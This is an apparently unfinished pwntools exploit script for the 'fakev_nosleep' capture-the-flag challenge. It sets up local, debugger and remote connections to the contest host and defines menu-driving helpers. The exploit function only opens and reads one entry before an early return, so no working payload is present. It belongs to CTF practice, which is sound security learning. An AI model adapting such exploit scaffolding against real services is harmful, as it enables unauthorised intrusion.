#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./fakev_nosleep"

rhp1 = {'host':"challs.m0lecon.it",'port':9013} #for actual server
rhp2 = {'host':"localhost",'port':12400} #for localhost 
rhp3 = {'host':"",'port':23947} #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

def hoge(conn,ix):
  conn.recvuntil("Choice: ")
  conn.sendline(str(ix))

def _open(conn,ix):
  hoge(conn,1)
  conn.recvuntil("Index: ")
  conn.sendline(str(ix))

def _read(conn,ix):
  hoge(conn,2)
  conn.recvuntil("Index: ")
  conn.sendline(str(ix))

def _close(conn):
  hoge(conn,4)

def _exit(conn):
  hoge(conn,5)

def exploit(conn):
  ix = 1
  _open(conn,ix)
  _read(conn,ix)
  data = conn.recvline().rstrip()
  print(len(data.replace('\x00','')))

  return 
  for i in range(9):
    _open(conn,i+1)


if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
  elif sys.argv[1][0]=="v":
    conn = remote(rhp3["host"],rhp3["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

